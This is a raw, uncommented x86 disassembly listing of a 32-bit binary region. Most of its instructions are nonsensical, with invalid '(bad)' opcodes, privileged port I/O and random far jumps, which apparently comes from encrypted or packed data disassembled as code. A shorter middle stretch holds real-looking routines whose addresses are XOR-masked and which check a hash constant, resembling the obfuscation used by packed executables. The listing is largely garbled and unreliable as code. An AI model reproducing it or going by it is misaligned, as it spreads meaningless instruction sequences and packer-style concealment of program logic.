  40a6b7:	mov    es,WORD PTR [edi]
  40a6b9:	push   ebx
  40a6ba:	add    al,0xe
  40a6bc:	dec    ebp
  40a6bd:	call   0x7604:0x3dba2822
  40a6c4:	pop    esi
  40a6c5:	call   0x2b0a:0x18dde339
  40a6cc:	add    al,0x2c
  40a6ce:	mov    BYTE PTR [ebp+0x62],0x98
  40a6d2:	inc    esi
  40a6d3:	jle    0x40a6fc
  40a6d5:	xchg   DWORD PTR [ebp+0x31],edi
  40a6d8:	mov    ah,cl
  40a6da:	ss mov cl,0xdf
  40a6dd:	mov    edi,0x75147fa9
  40a6e2:	push   0x1c307039
  40a6e7:	sbb    al,0xbb
  40a6e9:	mov    ss:0xa7093878,eax
  40a6ef:	xchg   ebx,eax
  40a6f0:	cmp    ecx,DWORD PTR [edi]
  40a6f2:	xchg   edx,eax
  40a6f3:	aas    
  40a6f4:	mov    DWORD PTR [ebx+0x69],ebx
  40a6f7:	mov    esp,0x479bf1be
  40a6fc:	in     eax,0x37
  40a6fe:	test   al,0x98
  40a700:	fs mov ch,0x5b
  40a703:	fsubr  QWORD PTR [eax+0x41bbdcba]
  40a709:	pushf  
  40a70a:	sub    al,0x1f
  40a70c:	cdq    
  40a70d:	jl     0x40a739
  40a70f:	int    0x6c
  40a711:	mov    cs,WORD PTR [ecx-0x3b]
  40a714:	(bad)  
  40a715:	mov    WORD PTR [ebp+0x3e],fs
  40a718:	sbb    BYTE PTR [esi],ch
  40a71a:	outs   dx,DWORD PTR ds:[esi]
  40a71b:	and    eax,0x6075e1d2
  40a720:	jle    0x40a744
  40a722:	mov    eax,DWORD PTR [ebp+eiz*2+0x3f]
  40a726:	inc    esp
  40a727:	test   al,0xe3
  40a729:	add    edx,esp
  40a72b:	es popfw 
  40a72e:	or     eax,DWORD PTR [ebp-0x50cfce98]
  40a734:	retf   0x8daf
  40a737:	out    dx,al
  40a738:	and    ah,BYTE PTR [ecx-0x6c]
  40a73b:	or     eax,DWORD PTR [esi-0x310d8be1]
  40a741:	mov    al,0xdc
  40a743:	out    0x8,al
  40a745:	xor    al,0x59
  40a747:	icebp  
  40a748:	jns    0x40a758
  40a74a:	add    al,0x19
  40a74c:	test   DWORD PTR [ebx+0x5684f545],0xfe933c27
  40a756:	mov    ch,0xd9
  40a758:	retf   
  40a759:	xor    eax,0x374c7053
  40a75e:	cli    
  40a75f:	(bad)  
  40a761:	out    0xa6,eax
  40a763:	rcr    ecx,cl
  40a765:	test   al,0x83
  40a767:	sbb    cl,BYTE PTR [ecx+ecx*2]
  40a76a:	dec    ecx
  40a76b:	outs   dx,DWORD PTR ds:[esi]
  40a76c:	xor    DWORD PTR cs:[esi-0x68],0x3aa01b7d
  40a774:	aad    0x21
  40a776:	stc    
  40a777:	add    eax,0x2a012bc6
  40a77c:	aad    0x32
  40a77e:	ret    0x4b1b
  40a781:	lahf   
  40a782:	daa    
  40a783:	push   eax
  40a784:	dec    edi
  40a785:	mov    ecx,?
  40a787:	jmp    0x5d211212
  40a78c:	xchg   edi,esi
  40a78e:	xor    ebp,esi
  40a790:	push   0x7c
  40a792:	push   ebx
  40a793:	psubsw mm2,QWORD PTR [ebx]
  40a796:	xor    al,0x8d
  40a798:	push   edi
  40a799:	(bad)  
  40a79a:	mov    WORD PTR [esi],gs
  40a79c:	xor    al,0x49
  40a79e:	scas   al,BYTE PTR es:[edi]
  40a79f:	aam    0xa9
  40a7a1:	mov    ss,esp
  40a7a3:	mov    ebx,0xdff39214
  40a7a8:	inc    edx
  40a7a9:	xchg   ecx,eax
  40a7aa:	xchg   esp,eax
  40a7ab:	sub    eax,0xf9ce7d0
  40a7b0:	xor    BYTE PTR [ecx+0x2f9c8420],ah
  40a7b6:	in     eax,dx
  40a7b7:	sbb    al,0x72
  40a7b9:	mov    edx,DWORD PTR [ebp-0xc]
  40a7bc:	xor    eax,esi
  40a7be:	add    eax,edi
  40a7c0:	imul   eax,edx
  40a7c3:	mov    edx,DWORD PTR [ebp-0x5c]
  40a7c6:	xor    edx,esi
  40a7c8:	add    eax,edx
  40a7ca:	mov    edx,DWORD PTR [ebp-0x8]
  40a7cd:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ef]
  40a7d5:	mov    edx,DWORD PTR [ebp-0x4c]
  40a7d8:	xor    edx,esi
  40a7da:	lea    eax,[edx+eax*1+0x3272ef]
  40a7e1:	movzx  edx,BYTE PTR [ebp-0x1]
  40a7e5:	xor    edx,eax
  40a7e7:	mov    BYTE PTR [ebp-0x1],dl
  40a7ea:	mov    al,BYTE PTR [ebp-0x1]
  40a7ed:	mov    edx,DWORD PTR [ebp-0x30]
  40a7f0:	mov    ebx,DWORD PTR [ebp-0xc]
  40a7f3:	xor    edx,esi
  40a7f5:	add    edx,edi
  40a7f7:	imul   edx,ebx
  40a7fa:	mov    ebx,DWORD PTR [ebp-0x8]
  40a7fd:	mov    BYTE PTR [edx+ebx*1],al
  40a800:	mov    eax,DWORD PTR [ebp-0x30]
  40a803:	mov    edx,DWORD PTR [ebp-0xc]
  40a806:	xor    eax,esi
  40a808:	add    eax,edi
  40a80a:	imul   eax,edx
  40a80d:	mov    edx,DWORD PTR [ebp-0x8]
  40a810:	mov    al,BYTE PTR [eax+edx*1]
  40a813:	mov    BYTE PTR [ebp-0x1],al
  40a816:	mov    eax,DWORD PTR [ebp-0x30]
  40a819:	mov    edx,DWORD PTR [ebp-0xc]
  40a81c:	xor    eax,esi
  40a81e:	add    eax,edi
  40a820:	imul   eax,edx
  40a823:	mov    edx,DWORD PTR [ebp-0x28]
  40a826:	xor    edx,esi
  40a828:	add    eax,edx
  40a82a:	mov    edx,DWORD PTR [ebp-0x8]
  40a82d:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ef]
  40a835:	mov    edx,DWORD PTR [ebp-0x50]
  40a838:	xor    edx,esi
  40a83a:	lea    eax,[edx+eax*1+0x3272ef]
  40a841:	movzx  edx,BYTE PTR [ebp-0x1]
  40a845:	xor    edx,eax
  40a847:	mov    BYTE PTR [ebp-0x1],dl
  40a84a:	mov    al,BYTE PTR [ebp-0x1]
  40a84d:	mov    edx,DWORD PTR [ebp-0x30]
  40a850:	mov    ebx,DWORD PTR [ebp-0xc]
  40a853:	xor    edx,esi
  40a855:	add    edx,edi
  40a857:	imul   edx,ebx
  40a85a:	mov    ebx,DWORD PTR [ebp-0x8]
  40a85d:	mov    BYTE PTR [edx+ebx*1],al
  40a860:	mov    eax,DWORD PTR [ebp-0x40]
  40a863:	mov    edx,DWORD PTR [ebp-0x28]
  40a866:	xor    eax,esi
  40a868:	xor    edx,esi
  40a86a:	add    eax,edi
  40a86c:	add    edx,edi
  40a86e:	imul   eax,edx
  40a871:	add    eax,DWORD PTR [ebp-0xc]
  40a874:	mov    DWORD PTR [ebp-0xc],eax
  40a877:	mov    eax,DWORD PTR [ebp-0xc]
  40a87a:	mov    edx,DWORD PTR [ebp-0x18]
  40a87d:	cmp    edx,eax
  40a87f:	jb     0x40604c
  40a885:	mov    eax,DWORD PTR [ebp-0x28]
  40a888:	mov    edx,DWORD PTR [ebp-0x18]
  40a88b:	xor    eax,esi
  40a88d:	add    eax,edi
  40a88f:	imul   eax,edx
  40a892:	mov    edx,DWORD PTR [ebp-0x1c]
  40a895:	xor    edx,esi
  40a897:	add    edx,edi
  40a899:	or     eax,edx
  40a89b:	mov    edx,DWORD PTR [ebp-0x20]
  40a89e:	xor    edx,esi
  40a8a0:	add    eax,edx
  40a8a2:	mov    edx,DWORD PTR [ebp-0x20]
  40a8a5:	xor    edx,esi
  40a8a7:	add    eax,edx
  40a8a9:	mov    edx,DWORD PTR [ebp-0x10]
  40a8ac:	lea    eax,[eax+edx*1+0x64e5de]
  40a8b3:	jmp    0x40a8c7
  40a8b8:	mov    eax,DWORD PTR [ebp-0x20]
  40a8bb:	mov    edx,DWORD PTR [ebp-0x10]
  40a8be:	xor    eax,esi
  40a8c0:	lea    eax,[eax+edx*1+0x3272ef]
  40a8c7:	mov    DWORD PTR [ebp-0x10],eax
  40a8ca:	jmp    0x405f99
  40a8cf:	mov    ebx,DWORD PTR [ebp-0x3c]
  40a8d2:	mov    eax,DWORD PTR [ebp+0xc]
  40a8d5:	xor    eax,esi
  40a8d7:	lea    ecx,[ecx+eax*1+0x3272ef]
  40a8de:	lea    eax,[ecx-0x3272ef]
  40a8e4:	xor    eax,esi
  40a8e6:	cmp    eax,0xf89c95b9
  40a8eb:	jne    0x405f3d
  40a8f1:	dec    DWORD PTR [ebp-0x34]
  40a8f4:	jne    0x405f31
  40a8fa:	mov    eax,DWORD PTR [ebp+0x8]
  40a8fd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a900:	mov    edx,DWORD PTR [ebp+0x8]
  40a903:	xor    ecx,esi
  40a905:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272ef]
  40a90c:	xor    eax,esi
  40a90e:	mov    al,BYTE PTR [eax+ebx*1+0x3272ef]
  40a915:	xor    edx,esi
  40a917:	mov    BYTE PTR [edx+ebx*1+0x3272ef],cl
  40a91e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a921:	xor    ecx,esi
  40a923:	mov    BYTE PTR [ecx+ebx*1+0x3272ef],al
  40a92a:	mov    eax,DWORD PTR [ebp+0xc]
  40a92d:	xor    eax,esi
  40a92f:	add    eax,edi
  40a931:	pop    edi
  40a932:	pop    esi
  40a933:	pop    ebx
  40a934:	leave  
  40a935:	ret    0x8
  40a938:	xor    eax,eax
  40a93a:	and    DWORD PTR ds:0x42a436,0x42a3da
  40a944:	inc    eax
  40a945:	ret    
  40a946:	push   ebp
  40a947:	mov    ebp,esp
  40a949:	sub    esp,0x38
  40a94c:	xor    DWORD PTR ds:0x42a3aa,ebx
  40a952:	jmp    0x40cd14
  40a957:	push   esp
  40a958:	cmp    BYTE PTR [ecx],0x21
  40a95b:	mov    ds:0xdb7b4481,eax
  40a960:	icebp  
  40a961:	cdq    
  40a962:	xchg   ebx,eax
  40a963:	mov    dl,0xec
  40a965:	xchg   edx,eax
  40a966:	fsub   DWORD PTR [edx-0xc]
  40a969:	jp     0x40a9e5
  40a96b:	fstp   QWORD PTR [edi+0x7a]
  40a96e:	jp     0x40a9a6
  40a970:	call   0xb4e:0x972ce01
  40a977:	mov    cl,0x45
  40a979:	dec    esi
  40a97a:	data16 mov bl,0xd9
  40a97d:	popf   
  40a97e:	sub    al,0xf1
  40a980:	in     al,dx
  40a981:	pop    eax
  40a982:	outs   dx,BYTE PTR ds:[esi]
  40a983:	imul   ebx
  40a985:	adc    edi,DWORD PTR [esi]
  40a987:	stos   DWORD PTR es:[edi],eax
  40a988:	mov    bh,BYTE PTR [ebx-0xe]
  40a98b:	jbe    0x40a9bd
  40a98d:	popa   
  40a98e:	mov    ecx,0x8c9ef14a
  40a993:	jmp    0x8c1a:0x289811ea
  40a99a:	dec    ebp
  40a99b:	mov    ds:0x317c36b4,al
  40a9a0:	inc    edi
  40a9a1:	jo     0x40a945
  40a9a3:	jmp    0xeca:0x26d85e13
  40a9aa:	jmp    0xa492:0xa2631a2
  40a9b1:	cdq    
  40a9b2:	xchg   esi,eax
  40a9b3:	jmp    0xbf57da4b
  40a9b8:	test   al,0xb2
  40a9ba:	lods   eax,DWORD PTR ds:[esi]
  40a9bb:	fist   DWORD PTR [eax]
  40a9bd:	pop    ss
  40a9be:	xchg   ebp,eax
  40a9bf:	fiadd  DWORD PTR [edi]
  40a9c1:	mov    edi,0x82055ab8
  40a9c6:	cli    
  40a9c7:	ss xchg esp,eax
  40a9c9:	dec    ebp
  40a9ca:	or     eax,0xb610753
  40a9cf:	retf   0x43ab
  40a9d2:	xchg   ecx,eax
  40a9d3:	sub    al,0xa5
  40a9d5:	shl    DWORD PTR gs:[edi+0x9],1
  40a9d9:	repnz dec ebx
  40a9db:	jecxz  0x40a9fc
  40a9dd:	mov    esp,0x4d79820a
  40a9e2:	(bad)  
  40a9e3:	push   ebx
  40a9e4:	add    ebx,DWORD PTR [esi]
  40a9e6:	enter  0xfca2,0xda
  40a9ea:	push   es
  40a9eb:	sbb    bh,0xd0
  40a9ee:	adc    eax,0x48ea60e1
  40a9f3:	and    esi,eax
  40a9f5:	in     al,0xbf
  40a9f7:	pop    ebx
  40a9f8:	pop    edx
  40a9f9:	into   
  40a9fa:	dec    ecx
  40a9fb:	test   DWORD PTR [edi+0x1a],0x6639ded8
  40aa02:	daa    
  40aa03:	cmp    BYTE PTR [esi-0xb],0xc3
  40aa07:	popf   
  40aa08:	jl     0x40aa3b
  40aa0a:	add    DWORD PTR [ebx],ecx
  40aa0c:	pop    esp
  40aa0d:	or     ebx,DWORD PTR [ebp+0x56e2b416]
  40aa13:	out    0xe,eax
  40aa15:	or     eax,0x3ed78224
  40aa1a:	mov    edx,0xa6ca99f1
  40aa1f:	cli    
  40aa20:	xchg   ecx,eax
  40aa21:	mov    eax,ds:0x5634d8d6
  40aa26:	mov    bl,0x88
  40aa28:	dec    ebx
  40aa29:	mov    ah,0x5
  40aa2b:	fist   WORD PTR [ecx]
  40aa2d:	cld    
  40aa2e:	lods   eax,DWORD PTR ds:[esi]
  40aa2f:	rcl    DWORD PTR [ecx+0x67],1
  40aa32:	sti    
  40aa33:	mov    DWORD PTR [ebp-0xb],edx
  40aa36:	int3   
  40aa37:	popa   
  40aa38:	jl     0x40aa2f
  40aa3a:	clc    
  40aa3b:	cmp    eax,0x155a6f0d
  40aa40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa41:	adc    eax,0x4f2ef0b
  40aa46:	jl     0x40a9f3
  40aa48:	pushf  
  40aa49:	in     eax,dx
  40aa4a:	push   edi
  40aa4b:	pop    edx
  40aa4c:	cmc    
  40aa4d:	ret    0x47d2
  40aa50:	lods   eax,DWORD PTR ds:[esi]
  40aa51:	adc    bh,cl
  40aa53:	gs int3 
  40aa55:	test   eax,0xed903506
  40aa5a:	mov    ecx,0x88db1484
  40aa5f:	xchg   edi,eax
  40aa60:	retf   0x5049
  40aa63:	mov    cl,0xdb
  40aa65:	cmp    BYTE PTR [edx+0x5c9b64fb],bl
  40aa6b:	and    al,0x3d
  40aa6d:	scas   al,BYTE PTR es:[edi]
  40aa6e:	mov    ah,0x40
  40aa70:	inc    eax
  40aa71:	es mov eax,0x352c9cf7
  40aa77:	rcr    DWORD PTR ss:[edx],cl
  40aa7a:	jmp    0xc1bc:0xe7242e54
  40aa81:	sbb    bl,dh
  40aa83:	sub    ch,BYTE PTR [eax]
  40aa85:	ror    BYTE PTR [esi-0x736e8a9a],cl
  40aa8b:	add    dl,0x2c
  40aa8e:	rcr    eax,cl
  40aa90:	outs   dx,BYTE PTR ds:[esi]
  40aa91:	and    ah,BYTE PTR [edi+0x13]
  40aa94:	imul   eax,DWORD PTR [ecx+0x5a],0xffffffc6
  40aa98:	ds mov edx,0x6d02379e
  40aa9e:	adc    edi,edi
  40aaa0:	iret   
  40aaa1:	out    0x6d,eax
  40aaa3:	out    0x30,al
  40aaa5:	fadd   QWORD PTR [eax-0x48c16569]
  40aaab:	fnstcw WORD PTR [edx]
  40aaad:	ds sahf 
  40aaaf:	push   ds
  40aab0:	ins    DWORD PTR es:[edi],dx
  40aab1:	das    
  40aab2:	cmp    eax,esi
  40aab4:	add    dh,BYTE PTR [edi*2+0x7ecdc784]
  40aabb:	stc    
  40aabc:	ret    
  40aabd:	int    0xa4
  40aabf:	ss fxch st(3)
  40aac2:	(bad)  
  40aac3:	ja     0x40aaa5
  40aac5:	inc    edx
  40aac6:	test   eax,0x38a4eba3
  40aacb:	xchg   ecx,eax
  40aacc:	sbb    ah,ch
  40aace:	xor    DWORD PTR [ecx],edi
  40aad0:	ins    DWORD PTR es:[edi],dx
  40aad1:	repz push ebx
  40aad3:	pop    edi
  40aad4:	xor    ch,bl
  40aad6:	(bad)  
  40aad7:	fwait
  40aad8:	dec    ebp
  40aad9:	test   DWORD PTR [esi-0x7c65f733],ebp
  40aadf:	xchg   ebx,eax
  40aae0:	ss mov bh,0x5f
  40aae3:	cmp    edi,DWORD PTR [ebp-0x2e]
  40aae6:	cwde   
  40aae7:	fst    QWORD PTR [di+0x27]
  40aaeb:	stos   DWORD PTR es:[edi],eax
  40aaec:	adc    BYTE PTR [esi-0x160868d5],bl
  40aaf2:	push   ds
  40aaf3:	test   BYTE PTR [ecx],dl
  40aaf5:	push   ds
  40aaf6:	inc    edi
  40aaf7:	shr    bh,0x15
  40aafa:	in     eax,0xdb
  40aafc:	loop   0x40ab66
  40aafe:	cmp    eax,ebx
  40ab00:	jmp    0x3d08:0x4d3bb72d
  40ab07:	mov    esp,esi
  40ab09:	nop
  40ab0a:	cs imul edx,ebx,0x14414d3f
  40ab11:	ret    0xfee3
  40ab14:	push   0xfffffff4
  40ab16:	stc    
  40ab17:	pop    ebx
  40ab18:	sbb    eax,0x8de600ad
  40ab1d:	mov    bl,bh
  40ab1f:	loope  0x40ab80
  40ab21:	clc    
  40ab22:	call   0xbc56:0x5458fe47
  40ab29:	jl     0x40aacc
  40ab2b:	mov    dl,0xfd
  40ab2d:	aas    
  40ab2e:	repnz dec ebx
  40ab30:	fisttp WORD PTR [esi-0x5ad1e402]
  40ab36:	pop    ecx
  40ab37:	inc    esp
  40ab38:	lea    eax,[ebx-0x30c1670c]
  40ab3e:	xchg   esp,eax
  40ab3f:	adc    DWORD PTR [edi],ecx
  40ab41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab42:	nop
  40ab43:	icebp  
  40ab44:	loopne 0x40ab0a
  40ab46:	push   DWORD PTR [eax+ecx*2+0x15805e42]
  40ab4d:	pop    ecx
  40ab4e:	cmp    DWORD PTR [edi+0x68],0x5131655f
  40ab55:	dec    esp
  40ab56:	mov    edi,0xc023118d
  40ab5b:	mov    al,BYTE PTR [edi]
  40ab5d:	sar    BYTE PTR [edi],0x1f
  40ab60:	push   ebx
  40ab61:	jno    0x40ab3a
  40ab63:	pop    edi
  40ab64:	sbb    BYTE PTR [edi-0x17],ch
  40ab67:	push   0x2c786822
  40ab6c:	xchg   ch,dl
  40ab6e:	sbb    al,0x47
  40ab70:	mov    ebp,0xbb1718c1
  40ab75:	retf   
  40ab76:	js     0x40ab9f
  40ab78:	in     al,0xe9
  40ab7a:	(bad)  
  40ab7b:	inc    ah
  40ab7d:	jno    0x40abda
  40ab7f:	icebp  
  40ab80:	push   es
  40ab81:	iret   
  40ab82:	and    al,0x21
  40ab84:	push   ss
  40ab85:	sbb    edx,DWORD PTR [ecx+0x5c]
  40ab88:	mov    ch,0x79
  40ab8a:	mov    edx,DWORD PTR [esi-0x2009fd56]
  40ab90:	mov    WORD PTR [edx*1-0x5cc154a2],gs
  40ab97:	inc    ebx
  40ab98:	mov    edi,0x9fea2a46
  40ab9d:	add    DWORD PTR [edi],0xaa936bca
  40aba3:	test   DWORD PTR [esi-0x9],0xb6213ade
  40abaa:	icebp  
  40abab:	cdq    
  40abac:	pop    esp
  40abad:	aad    0xcb
  40abaf:	sbb    BYTE PTR [edx+0x46],0xc9
  40abb3:	(bad)
  40abb6:	fdiv   st,st(3)
  40abb8:	scas   eax,DWORD PTR es:[edi]
  40abb9:	or     BYTE PTR [esi+0x55],bl
  40abbc:	in     eax,0x56
  40abbe:	or     al,0x69
  40abc0:	out    dx,eax
  40abc1:	mov    ah,0xa2
  40abc3:	cmp    DWORD PTR [eax-0x7b],edi
  40abc6:	push   es
  40abc7:	fs sti 
  40abc9:	xchg   ecx,eax
  40abca:	inc    ecx
  40abcb:	sbb    esi,DWORD PTR [esi+0x333ac96d]
  40abd1:	(bad)  
  40abd2:	push   ebp
  40abd3:	pop    edx
  40abd4:	ret    
  40abd5:	ins    BYTE PTR es:[edi],dx
  40abd6:	push   ss
  40abd7:	loope  0x40abce
  40abd9:	repz dec eax
  40abdb:	loop   0x40abc3
  40abdd:	jge    0x40ab63
  40abdf:	in     eax,dx
  40abe0:	mov    BYTE PTR [edi],ah
  40abe2:	outs   dx,BYTE PTR cs:[esi]
  40abe4:	mov    bh,BYTE PTR [edi-0x21]
  40abe7:	push   edi
  40abe8:	mov    ebx,0x18cfd1b3
  40abed:	add    al,0x9e
  40abef:	fadd   st,st(6)
  40abf1:	adc    ecx,DWORD PTR [ecx-0x489f5e2f]
  40abf7:	sub    BYTE PTR [esi+0x54bae899],0x1a
  40abfe:	add    ebx,DWORD PTR [edi+0x44]
  40ac01:	and    esi,eax
  40ac03:	add    DWORD PTR [ebx+0x26],edi
  40ac06:	sub    eax,0xbecf6805
  40ac0b:	js     0x40abfb
  40ac0d:	retf   
  40ac0e:	scas   al,BYTE PTR es:[edi]
  40ac0f:	(bad)  
  40ac10:	hlt    
  40ac11:	pop    ss
  40ac12:	xchg   esi,esi
  40ac14:	pop    edx
  40ac15:	inc    esp
  40ac16:	les    ebx,FWORD PTR [ecx+0x11]
  40ac19:	loopne 0x40abf7
  40ac1b:	out    0xae,al
  40ac1d:	hlt    
  40ac1e:	cmp    BYTE PTR [ecx],cl
  40ac20:	test   esi,ebx
  40ac22:	int3   
  40ac23:	mov    dl,0x55
  40ac25:	pushf  
  40ac26:	xchg   ecx,eax
  40ac27:	or     esi,DWORD PTR [ebx]
  40ac29:	ja     0x40ac37
  40ac2b:	mov    cl,BYTE PTR [ecx+0x1f]
  40ac2e:	sahf   
  40ac2f:	push   0xfffffff8
  40ac31:	movaps xmm2,xmm0
  40ac34:	out    0x38,al
  40ac36:	jp     0x40abef
  40ac38:	arpl   WORD PTR [ecx+0x3b142f09],bx
  40ac3e:	add    eax,0xb58ee35f
  40ac43:	push   0xa7ebec80
  40ac48:	cmp    eax,0x343a6e76
  40ac4d:	ret    
  40ac4e:	push   cs
  40ac4f:	push   0xf150e571
  40ac54:	and    eax,0xbc7bed81
  40ac59:	cmp    bh,BYTE PTR [ebp+0x0]
  40ac5c:	mov    ch,0x12
  40ac5e:	jnp    0x40ac12
  40ac60:	add    eax,0x884d4f3c
  40ac65:	fbld   TBYTE PTR [eax]
  40ac67:	pop    es
  40ac68:	dec    edx
  40ac69:	pop    edx
  40ac6a:	pop    eax
  40ac6b:	pop    esi
  40ac6c:	xor    DWORD PTR [esp+ecx*8],esi
  40ac6f:	daa    
  40ac70:	mov    ecx,ebp
  40ac72:	adc    ebp,ebx
  40ac74:	pop    ebx
  40ac75:	add    edi,DWORD PTR [esi-0x664c808f]
  40ac7b:	sbb    al,BYTE PTR [ebx+0x4e]
  40ac7e:	adc    cl,ch
  40ac80:	dec    DWORD PTR [eax]
  40ac82:	pop    es
  40ac83:	call   0x9ab4bb92
  40ac88:	daa    
  40ac89:	mov    ah,0xce
  40ac8b:	jecxz  0x40ac13
  40ac8d:	sub    ch,ah
  40ac8f:	in     eax,dx
  40ac90:	clc    
  40ac91:	(bad)  
  40ac92:	icebp  
  40ac93:	push   esi
  40ac94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac95:	std    
  40ac96:	inc    esi
  40ac97:	mov    cl,0xb9
  40ac99:	pop    gs
  40ac9b:	jecxz  0x40ace8
  40ac9d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac9f:	xor    ebp,ecx
  40aca1:	daa    
  40aca2:	repz test DWORD PTR [eax+0x7d],ebx
  40aca6:	ds xchg edi,eax
  40aca8:	adc    DWORD PTR [esi+0x36],esp
  40acab:	pop    ss
  40acac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acad:	and    BYTE PTR [ebx-0x74],dl
  40acb0:	mov    edx,0xe7745b3d
  40acb5:	pusha  
  40acb6:	mov    ch,0xac
  40acb8:	cmp    ebp,DWORD PTR [ebp+0x5669423b]
  40acbe:	adc    ch,BYTE PTR [esp+esi*4-0x204da2a6]
  40acc5:	pop    es
  40acc6:	mov    eax,ds:0xe387b972
  40accb:	sub    dl,BYTE PTR [edx]
  40accd:	frstor [edx]
  40accf:	in     al,dx
  40acd0:	push   edx
  40acd1:	sub    BYTE PTR [ecx],dl
  40acd3:	mov    ch,0x8
  40acd5:	fild   DWORD PTR [edi-0x6a]
  40acd8:	push   esi
  40acd9:	sbb    ebp,DWORD PTR [eax]
  40acdb:	lahf   
  40acdc:	add    al,0x70
  40acde:	inc    esi
  40acdf:	js     0x40ac64
  40ace1:	jg     0x40acff
  40ace3:	jecxz  0x40aca9
  40ace5:	xor    DWORD PTR [ebx],ecx
  40ace7:	mov    ah,0x45
  40ace9:	imul   ecx,eax,0x51f54218
  40acef:	jmp    0x40ad09
  40acf1:	xchg   esi,eax
  40acf2:	out    0xd6,al
  40acf4:	scas   al,BYTE PTR es:[edi]
  40acf5:	sbb    bh,BYTE PTR [edx+ebx*4-0x51]
  40acf9:	aaa    
  40acfa:	mov    eax,ebp
  40acfc:	add    eax,0xfd860995
  40ad01:	addr16 adc al,0x47
  40ad04:	mov    ch,0xd2
  40ad06:	mov    al,ds:0x3a33de9f
  40ad0b:	xchg   edi,eax
  40ad0c:	jl     0x40acc6
  40ad0e:	ret    0x226f
  40ad11:	fucomp st(3)
  40ad13:	mov    ds:0x758f601d,eax
  40ad18:	cmp    ebp,DWORD PTR [eax]
  40ad1a:	(bad)
  40ad1f:	xor    al,0x21
  40ad21:	jb     0x40accc
  40ad23:	outs   dx,BYTE PTR ds:[esi]
  40ad24:	jae    0x40ad6a
  40ad26:	rol    BYTE PTR [ebx+0x4271cacb],cl
  40ad2c:	test   al,0xff
  40ad2e:	sub    ecx,0x42
  40ad31:	ror    DWORD PTR [edx-0x8],0x44
  40ad35:	int3   
  40ad36:	mov    esp,0xbaca9d83
  40ad3b:	cmp    cl,BYTE PTR [ebx]
  40ad3d:	push   edi
  40ad3e:	loop   0x40aceb
  40ad40:	shl    ebp,1
  40ad42:	pop    esp
  40ad43:	loope  0x40acff
  40ad45:	popf   
  40ad46:	xchg   BYTE PTR [esi-0x5b678f61],dh
  40ad4c:	xchg   ebp,eax
  40ad4d:	adc    ebp,0x46ef283
  40ad53:	loop   0x40ad2b
  40ad55:	dec    ax
  40ad57:	repz sub DWORD PTR [eax+0x34b58b04],edx
  40ad5e:	fmul   QWORD PTR [eax+0x2d6cb98b]
  40ad64:	push   eax
  40ad65:	sub    BYTE PTR [ebx+0x339d2e2e],ch
  40ad6b:	and    bh,BYTE PTR [edx+0x228af469]
  40ad71:	sbb    dl,BYTE PTR [ecx+0x195b9fbd]
  40ad77:	aam    0xbd
  40ad79:	dec    ebx
  40ad7a:	aam    0x60
  40ad7c:	pop    ss
  40ad7d:	and    BYTE PTR [ebp+0x7f],ch
  40ad80:	sbb    bl,BYTE PTR [ebx]
  40ad82:	ficom  WORD PTR [edx]
  40ad84:	rcl    BYTE PTR [eax],0x17
  40ad87:	inc    ebp
  40ad88:	inc    BYTE PTR [esi+0x676fe9e5]
  40ad8e:	hlt    
  40ad8f:	mov    bl,0x3e
  40ad91:	sbb    eax,0x8cec534
  40ad96:	hlt    
  40ad97:	add    BYTE PTR ds:0x4d1365f9,cl
  40ad9d:	ret    0xedd8
  40ada0:	ret    0xc45e
  40ada3:	sar    DWORD PTR [esi-0x262ec41e],1
  40ada9:	jp     0x40ad3b
  40adab:	js     0x40ad8d
  40adad:	mov    al,0xe3
  40adaf:	jno    0x40adda
  40adb1:	repz mov ds:0x8854fd67,eax
  40adb7:	clc    
  40adb8:	pop    eax
  40adb9:	adc    cl,BYTE PTR [ebx-0xd]
  40adbc:	sub    al,0xa5
  40adbe:	or     eax,0x25f80712
  40adc3:	inc    ecx
  40adc4:	push   0xffffffe9
  40adc6:	lds    edi,FWORD PTR [esi+0x6e]
  40adc9:	(bad)  
  40adcb:	sbb    BYTE PTR [edi-0x20a16705],bl
  40add1:	test   eax,0x144a7f70
  40add6:	mov    al,ds:0x5173f28e
  40addb:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40addd:	pop    edx
  40adde:	pop    esi
  40addf:	jmp    0x3295:0x3241c476
  40ade6:	fadd   DWORD PTR [eax-0x54]
  40ade9:	pop    eax
  40adea:	or     DWORD PTR [edi+edx*1+0x5a],0x7f2779d2
  40adf2:	xor    DWORD PTR [edx-0x73f4425b],esp
  40adf8:	loope  0x40ae64
  40adfa:	inc    eax
  40adfb:	mov    esp,fs
  40adfd:	out    dx,eax
  40adfe:	mov    al,ss:0x3477ae8c
  40ae04:	or     esi,ecx
  40ae06:	and    DWORD PTR [ecx],ebx
  40ae08:	pop    esi
  40ae09:	stc    
  40ae0a:	jmp    0xd592:0x6126d6b8
  40ae11:	or     esi,DWORD PTR fs:[eax-0x26]
  40ae15:	dec    eax
  40ae16:	rep outs dx,DWORD PTR ds:[esi]
  40ae18:	xchg   esp,eax
  40ae19:	xchg   edx,eax
  40ae1a:	push   edx
  40ae1b:	popf   
  40ae1c:	es inc ebx
  40ae1e:	shl    BYTE PTR [ebx+0x1c28fb15],0x44
  40ae25:	jns    0x40ae95
  40ae27:	fst    QWORD PTR [ecx]
  40ae29:	inc    eax
  40ae2a:	ss xchg edi,eax
  40ae2c:	(bad)  
  40ae2d:	sbb    al,0x18
  40ae2f:	cmp    DWORD PTR [ecx+0x5c],esi
  40ae32:	test   BYTE PTR [edi+ebx*2+0x2],cl
  40ae36:	fsubr  DWORD PTR [edx+eiz*2]
  40ae39:	out    dx,eax
  40ae3a:	mov    eax,ds:0x5041e0fa
  40ae3f:	fucomip st,st(7)
  40ae41:	mov    DWORD PTR [eax+0x3a4a682d],edx
  40ae47:	ret    
  40ae48:	outs   dx,BYTE PTR ds:[esi]
  40ae49:	inc    edi
  40ae4a:	ins    DWORD PTR es:[edi],dx
  40ae4b:	dec    ecx
  40ae4c:	dec    ecx
  40ae4d:	and    BYTE PTR [eax-0x8],bh
  40ae50:	mov    cl,0x76
  40ae52:	push   esp
